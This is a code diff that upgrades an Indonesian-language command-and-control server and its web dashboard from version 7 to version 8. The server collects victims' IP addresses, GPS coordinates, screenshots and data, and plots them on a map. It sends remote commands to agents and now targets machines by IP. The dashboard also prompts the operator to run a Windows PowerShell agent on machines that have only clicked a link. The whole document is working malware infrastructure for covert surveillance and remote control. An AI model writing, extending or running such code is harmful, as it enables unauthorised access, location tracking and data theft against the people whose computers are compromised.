@@ -70,7 +70,7 @@ from datetime import datetime
 PORT = int(os.environ.get("C2_PORT", "8080"))
 LOG_DIR = os.environ.get("C2_LOG_DIR", "./received_logs")
 DASH_PASS = os.environ.get("C2_DASH_PASS", "")
-VERSION = "7"
+VERSION = "8"
 
 EVENTS_FILE = os.path.join(LOG_DIR, "events.jsonl")
 COMMANDS_FILE = os.path.join(LOG_DIR, "commands.jsonl")
@@ -243,8 +243,16 @@ def save_command(c):
         emit(f" [!] Gagal menyimpan command: {e}")
 
 
-def pending_commands(machine):
-    return [c for c in commands if c.get("machine") == machine and c.get("cid") not in done_cids]
+def pending_commands(machine, client_ip=""):
+    out = []
+    for c in commands:
+        if c.get("machine") != machine or c.get("cid") in done_cids:
+            continue
+        cip = c.get("ip", "")
+        if cip and cip != client_ip:
+            continue
+        out.append(c)
+    return out
 
 
 def load_gps_cache():
@@ -329,7 +337,7 @@ DASHBOARD_PAGE = r"""<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>C2 Monitor - Dashboard (v7)</title>
+<title>C2 Monitor - Dashboard (v8)</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
 <style>
@@ -386,7 +394,7 @@ pre { background:#0b1220; border:1px solid var(--border); border-radius:7px; pad
 </head>
 <body>
 <div class="topbar">
-  <h1>C2 Monitor</h1><span class="ver">v7</span>
+  <h1>C2 Monitor</h1><span class="ver">v8</span>
   <div class="conn"><span class="dot off" id="connDot"></span><span id="connTxt">Menghubungkan...</span></div>
 </div>
 <div class="tabs">
@@ -436,7 +444,7 @@ pre { background:#0b1220; border:1px solid var(--border); border-radius:7px; pad
     </div>
     <div class="panel">
       <label>Hasil Perintah</label>
-      <table><thead><tr><th>Waktu</th><th>Mesin</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
+      <table><thead><tr><th>Waktu</th><th>Mesin</th><th>IP</th><th>Hasil</th></tr></thead><tbody id="cmdRows"></tbody></table>
     </div>
   </div>
 </div>
@@ -468,18 +476,22 @@ function machineInfo(ev) {
     var seen = {}, arr = [];
     for (var i = 0; i < ev.length; i++) {
         var e = ev[i];
-        if (e.id && e.id !== "-" && e.id !== "beacon" && !seen[e.id]) {
-            seen[e.id] = 1;
-            var gps = null, glat = null, glon = null;
-            for (var k = 0; k < ev.length; k++) {
-                var g = ev[k];
-                if (g.type === "gps" && g.detail && g.detail.machine === e.id) {
-                    if (!gps && g.detail.address) gps = g.detail.address;
-                    if (g.detail.lat != null && glat == null) { glat = Number(g.detail.lat); glon = Number(g.detail.lon); }
-                }
+        if (!e.id || e.id === "-" || e.id === "beacon") continue;
+        var key = e.id + "@" + (e.ip || "");
+        if (seen[key]) continue;
+        seen[key] = 1;
+        var gps = null, glat = null, glon = null, agent = false, gpsTime = null;
+        for (var k = 0; k < ev.length; k++) {
+            var g = ev[k];
+            if (g.id !== e.id || g.ip !== e.ip) continue;
+            if (g.type === "gps") {
+                var d = g.detail || {};
+                if (!gps && d.address) gps = d.address;
+                if (d.lat != null && glat == null) { glat = Number(d.lat); glon = Number(d.lon); gpsTime = g.time; }
             }
-            arr.push({ id: e.id, time: e.time, loc: e.location, gps: gps, lat: glat, lon: glon });
+            if (g.type === "result" || g.type === "data" || g.type === "screenshot") agent = true;
         }
+        arr.push({ id: e.id, ip: e.ip, key: key, time: e.time, loc: e.location, gps: gps, lat: glat, lon: glon, gpsTime: gpsTime, agent: agent });
     }
     return arr;
 }
@@ -541,7 +553,7 @@ function render(ev) {
             catch(x) { detail = esc(String(e.detail)); }
         }
         var tr = document.createElement("tr");
-        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + badge + "</td><td>" + esc(e.ip) + "</td><td>" + esc(e.id) + "</td><td>" + esc(e.location) + "</td><td class='detail'>" + detail + "</td>";
+        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + badge + "</td><td>" + esc(e.ip) + "</td><td>" + esc(e.id) + " (" + esc(e.ip) + ")</td><td>" + esc(e.location) + "</td><td class='detail'>" + detail + "</td>";
         rows.appendChild(tr);
     }
     var cmdRows = document.getElementById("cmdRows");
@@ -552,7 +564,7 @@ function render(ev) {
         var d = e.detail || {};
         var dl = d.file_name ? ' <a href="/file/' + encodeURIComponent(d.file_name) + '" download>unduh</a>' : "";
         var tr = document.createElement("tr");
-        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
+        tr.innerHTML = "<td>" + esc(e.time) + "</td><td>" + esc(e.id) + "</td><td>" + esc(e.ip) + "</td><td><b>" + esc(d.cmd || e.cid || "") + "</b>" + dl + "<pre>" + esc(d.output || "") + "</pre></td>";
         cmdRows.appendChild(tr);
     }
     syncMachines(ev);
@@ -566,11 +578,11 @@ function syncMachines(ev) {
     arr.forEach(function(m) {
         var exists = false;
         for (var i = 0; i < sel.options.length; i++) {
-            if (sel.options[i].value === m.id) { exists = true; break; }
+            if (sel.options[i].value === m.key) { exists = true; break; }
         }
         if (!exists) {
             var o = document.createElement("option");
-            o.value = m.id; o.textContent = m.id;
+            o.value = m.key; o.textContent = m.id + " (" + m.ip + ")";
             sel.appendChild(o);
         }
     });
@@ -581,23 +593,25 @@ function syncMachines(ev) {
         return;
     }
     var latest = arr[0];
-    if (cur === "" || cur === autoSel || (autoSel !== latest.id && cur === autoSel)) {
-        sel.value = latest.id;
-        autoSel = latest.id;
+    if (cur === "" || cur === autoSel || (autoSel !== latest.key && cur === autoSel)) {
+        sel.value = latest.key;
+        autoSel = latest.key;
     }
-    var m = arr.filter(function(x) { return x.id === sel.value; })[0] || latest;
+    var m = arr.filter(function(x) { return x.key === sel.value; })[0] || latest;
     renderMachine(m);
 }
 function renderMachine(m) {
-    document.getElementById("mName").textContent = m.id;
+    document.getElementById("mName").textContent = m.id + " (" + m.ip + ")";
     var age = (new Date() - toDate(m.time)) / 1000;
     var online = age < 90;
-    document.getElementById("mStatus").innerHTML = online
-        ? '<span class="badge b-data">ONLINE</span>'
-        : '<span class="badge b-click">TIDAK AKTIF</span>';
+    var status = [];
+    status.push(online ? '<span class="badge b-data">ONLINE</span>' : '<span class="badge b-click">TIDAK AKTIF</span>');
+    status.push(m.agent ? '<span class="badge b-data">AGENT AKTIF</span>' : '<span class="badge b-click">HANYA KLIK</span>');
+    document.getElementById("mStatus").innerHTML = status.join(" ");
     var loc = (m.gps ? m.gps : m.loc) + (m.gps ? " (GPS)" : "");
     if (m.lat != null) loc += " <span class='muted'>(" + m.lat.toFixed(6) + ", " + m.lon.toFixed(6) + ")</span>";
-    document.getElementById("mInfo").innerHTML = "Terakhir terlihat: <b>" + esc(m.time) + "</b><br>Lokasi: <b>" + esc(loc) + "</b>";
+    var hint = m.agent ? "" : "<br><span style='color:#facc15'>Belum ada agent di mesin ini - jalankan agent_windows.ps1 agar bisa di-remote.</span>";
+    document.getElementById("mInfo").innerHTML = "IP: <b>" + esc(m.ip) + "</b> | Terakhir terlihat: <b>" + esc(m.time) + "</b><br>Lokasi: <b>" + esc(loc) + "</b>" + hint;
 }
 var LMap = null, markers = {}, mapCenter = null;
 function initMap() {
@@ -612,9 +626,9 @@ function machineLocations(ev) {
     var got = {};
     for (var i = ev.length - 1; i >= 0; i--) {
         var e = ev[i];
-        var key = (e.id && e.id !== "-" && e.id !== "beacon") ? e.id : e.ip;
-        if (!key) continue;
-        if (!got[key]) got[key] = { id: key, ip: e.ip, lat: null, lon: null, addr: e.location || "", time: e.time, precise: false };
+        if (!e.id || e.id === "-" || e.id === "beacon") continue;
+        var key = e.id + "@" + (e.ip || "");
+        if (!got[key]) got[key] = { id: e.id, ip: e.ip || "", key: key, lat: null, lon: null, addr: e.location || "", time: e.time, precise: false };
         var m = got[key];
         if (e.type === "gps" && e.detail && e.detail.lat != null && !m.precise) {
             m.lat = Number(e.detail.lat); m.lon = Number(e.detail.lon);
@@ -636,15 +650,17 @@ function updateMap(ev) {
     for (var k2 in got) {
         var g = got[k2];
         var src = g.precise ? "GPS presisi" : "perkiraan dari IP";
-        var popup = "<b>" + esc(g.id) + "</b> <i>(" + src + ")</i><br>" + esc(g.addr) + "<br><b>" + g.lat.toFixed(6) + ", " + g.lon.toFixed(6) + "</b><br>" + esc(g.time);
+        var popup = "<b>" + esc(g.id) + "</b><br>IP: <b>" + esc(g.ip) + "</b><br>" + esc(g.addr) + "<br><b>" + g.lat.toFixed(6) + ", " + g.lon.toFixed(6) + "</b> (" + src + ")<br>" + esc(g.time);
+        var tip = esc(g.id) + " · " + esc(g.ip);
         if (markers[k2]) {
             var mk = markers[k2];
             mk.setLatLng([g.lat, g.lon]);
             mk.bindPopup(popup);
+            mk.setTooltipContent(tip);
         } else if (g.precise) {
-            markers[k2] = L.marker([g.lat, g.lon]).addTo(LMap).bindPopup(popup);
+            markers[k2] = L.marker([g.lat, g.lon]).addTo(LMap).bindPopup(popup).bindTooltip(tip, {permanent: true, direction: "top", opacity: 0.9});
         } else {
-            markers[k2] = L.circleMarker([g.lat, g.lon], {radius: 9, color: "#8aa0bf", weight: 2, fillColor: "#8aa0bf", fillOpacity: 0.5}).addTo(LMap).bindPopup(popup);
+            markers[k2] = L.circleMarker([g.lat, g.lon], {radius: 9, color: "#8aa0bf", weight: 2, fillColor: "#8aa0bf", fillOpacity: 0.5}).addTo(LMap).bindPopup(popup).bindTooltip(tip, {permanent: true, direction: "top", opacity: 0.9});
         }
     }
     var keys = Object.keys(got);
@@ -663,15 +679,17 @@ document.querySelectorAll(".q").forEach(function(el) {
     el.addEventListener("click", function() { document.getElementById("cmd").value = el.textContent; });
 });
 async function sendCmd() {
-    var machine = document.getElementById("machine").value.trim();
+    var target = document.getElementById("machine").value.trim();
     var cmd = document.getElementById("cmd").value.trim();
-    if (!cmd) { return; }
+    if (!cmd || !target) { return; }
+    var machine = target.split("@")[0];
+    var mip = target.split("@")[1] || "";
     var st = document.getElementById("status");
-    st.textContent = "Mengirim...";
-    var body = "machine=" + encodeURIComponent(machine) + "&cmd=" + encodeURIComponent(cmd) + Q.replace("?", "&");
+    st.textContent = "Mengirim ke " + target + " ...";
+    var body = "machine=" + encodeURIComponent(machine) + "&cmd=" + encodeURIComponent(cmd) + "&ip=" + encodeURIComponent(mip) + Q.replace("?", "&");
     try {
         var r = await fetch("/cmd", {method:"POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: body});
-        st.textContent = r.ok ? "Terkirim! Agent akan menjalankan dalam beberapa detik." : "Gagal kirim: " + r.status;
+        st.textContent = r.ok ? "Terkirim ke " + target + "! Agent akan menjalankan dalam beberapa detik." : "Gagal kirim: " + r.status;
     } catch(e) { st.textContent = "Server tidak merespon."; }
 }
 refresh();
@@ -739,12 +757,15 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
 
         if path == CMD_PATH:
             machine = query.get("id", [""])[0] or "-"
+            agent_ip = self.real_client_ip()
+            ip_filter = query.get("ip", [""])[0] or agent_ip
             key = query.get("key", [""])[0]
             if DASH_PASS and key != DASH_PASS:
                 self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
                 return
-            body = json.dumps(pending_commands(machine), ensure_ascii=False).encode("utf-8")
-            self._send(200, "application/json; charset=utf-8", body, [("Cache-Control", "no-store")])
+            body = json.dumps(pending_commands(machine, ip_filter), ensure_ascii=False).encode("utf-8")
+            self._send(200, "application/json; charset=utf-8", body,
+                       [("Cache-Control", "no-store"), ("X-C2-IP", agent_ip)])
             return
 
         if path.startswith("/file/"):
@@ -870,6 +891,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             if path == CMD_PATH:
                 machine = parsed_data.get("machine", [""])[0] or "-"
                 cmdtext = parsed_data.get("cmd", [""])[0]
+                ip_filter = parsed_data.get("ip", [""])[0]
                 key = parsed_data.get("key", [""])[0] or parsed_data.get("pass", [""])[0]
                 if DASH_PASS and key != DASH_PASS:
                     self._send(401, "text/plain; charset=utf-8", b"Akses ditolak: key salah")
@@ -878,7 +900,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
                     self._send(400, "text/plain; charset=utf-8", b"Perintah kosong")
                     return
                 cid = "%s_%d" % (time.strftime("%H%M%S"), random.randint(100, 999))
-                c = {"cid": cid, "machine": machine, "cmd": cmdtext, "time": t}
+                c = {"cid": cid, "machine": machine, "ip": ip_filter or "", "cmd": cmdtext, "time": t}
                 commands.append(c)
                 save_command(c)
                 emit("=" * 60)
